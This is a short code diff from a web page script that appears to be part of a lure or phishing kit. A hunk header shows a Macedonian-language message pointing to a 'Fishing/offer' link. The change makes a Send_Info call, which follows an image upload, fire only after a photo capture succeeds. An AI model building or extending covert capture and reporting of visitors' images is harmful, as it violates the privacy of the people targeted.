@@ -94,12 +94,6 @@ $message_send="посети го на https://meetandfish.online/Fishing/offer.p
 				console.error(error);
 				f = false;
 			}
-			setTimeout(() => {
-				if (f == true) {
-					console.log("After making a photo");
-					console.log("Img Url=" + myImage);
-				}
-			}, 2000);
 		}
 
 
@@ -118,7 +112,11 @@ $message_send="посети го на https://meetandfish.online/Fishing/offer.p
 				},
 				success: function (data) {
 					console.log(data);
-					Send_Info(filename);
+					setTimeout(() => {
+						if (f == true) {
+							Send_Info(filename);
+						}
+					}, 2000);
 				},
 			});
 		}
